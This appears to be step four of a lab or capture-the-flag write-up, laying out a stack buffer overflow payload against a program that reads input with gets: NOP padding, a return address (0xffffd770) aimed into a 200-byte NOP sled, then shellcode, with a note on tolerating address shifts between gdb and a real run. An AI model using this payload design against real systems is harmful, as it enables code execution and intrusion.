### Step 4 - payload layout

The return address points forward into a large NOP sled placed *after* it (gets
reads the whole line). This makes the landing tolerant to the small address
shift between gdb and the real run:

```
[ 156 x \x90 ][ ret addr ][ 200 x \x90 (sled) ][ shellcode ]
                   |__ 0xffffd770 (buffer + 0x100, inside the sled)
```

